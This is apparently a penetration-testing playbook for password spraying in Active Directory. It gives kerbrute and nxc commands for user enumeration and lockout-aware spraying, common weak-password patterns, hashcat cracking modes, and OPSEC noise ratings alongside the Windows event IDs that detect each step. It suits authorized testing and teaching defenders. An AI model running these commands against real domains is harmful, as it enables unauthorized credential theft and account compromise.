# Password Spraying and Attacks

tags: password, spray, spraying, brute-force, kerbrute, nxc, hashcat, credential, ntlm, kerberos, cracking

## Objective
Discover valid credentials through password spraying, user enumeration, and offline hash cracking.

## Prerequisites
- List of valid usernames (from AD Discovery, RID cycling, or Kerberos enumeration)
- Password policy information (lockout threshold, observation window)
- Domain controller reachable

## Methodology

### Step 1 — Get Password Policy (ALWAYS FIRST)
```bash
nxc smb DC -u user -p pass --pass-pol
```
Note lockout threshold and observation window. **Never spray without this.**

### Step 2 — User Enumeration via Kerberos (OPSEC: 0.3)
```bash
# No lockout risk, no 4625 events
kerbrute userenum -d dom.com --dc DC users.txt
# Valid: KDC_ERR_PREAUTH_REQUIRED
# Invalid: KDC_ERR_C_PRINCIPAL_UNKNOWN
```

### Step 3 — Password Spraying

**Kerberos spray (preferred — OPSEC: 0.5, no 4625 events)**
```bash
kerbrute passwordspray -d dom.com --dc DC users.txt 'Summer2025!'
```

**SMB spray (OPSEC: 0.6 — generates 4625 events)**
```bash
nxc smb DC -u users.txt -p 'Password123!' -d DOMAIN --continue-on-success
```

**Spray methodology:**
1. One password per lockout window
2. Wait observation window + buffer before next attempt
3. If 5 attempts/30 min lockout → spray **1 password**, wait **31 minutes**

**Common password patterns:**
- `Season+Year+Symbol`: Spring2025!, Summer2025!, Winter2024!
- `CompanyName+Year`: Acme2025!
- Welcome1, Password1, Changeme1, Monday1!

### Step 4 — Validate Hits
```bash
# Confirm access level for valid creds
nxc smb DC -u validuser -p validpass --shares

# Check admin access across all targets
nxc smb TARGETS -u validuser -p validpass --continue-on-success
```

### Offline Hash Cracking Reference

| Hashcat Mode | Hash Type | Command |
|-------------|-----------|---------|
| 1000 | NTLM | `hashcat -m 1000 hashes.txt wordlist -r best64.rule` |
| 13100 | Kerberoast (RC4) | `hashcat -m 13100 tgs.txt wordlist -r best64.rule` |
| 18200 | AS-REP | `hashcat -m 18200 asrep.txt wordlist -r OneRuleToRuleThemAll.rule` |
| 5600 | NTLMv2 (NetNTLM) | `hashcat -m 5600 ntlmv2.txt wordlist` |

## Graph Reporting
- **Credential nodes**: for valid username/password combos (`cred_type: plaintext`)
- **VALID_ON edges**: credential → user node
- **ADMIN_TO edges**: where credential grants admin access (from `--continue-on-success` output)

## OPSEC Notes

| Technique | Noise Rating | Detection |
|-----------|-------------|-----------|
| Kerberos user enum | 0.3 | Event 4768/4771 |
| Kerberos spray | 0.5 | Event 4768 |
| SMB spray | 0.6 | Event 4625 |
| OWA spray | 0.5 | Exchange IIS logs |

**Detection**: Event 4625 (failed logon) from single source IP, 4768/4771 (Kerberos pre-auth), account lockout events (4740), threshold-based alerts.

## Sequencing
- **After**: AD Discovery (user list), SMB Enumeration (password policy)
- **Feeds →**: Credential validation → Lateral Movement, Kerberos Attacks
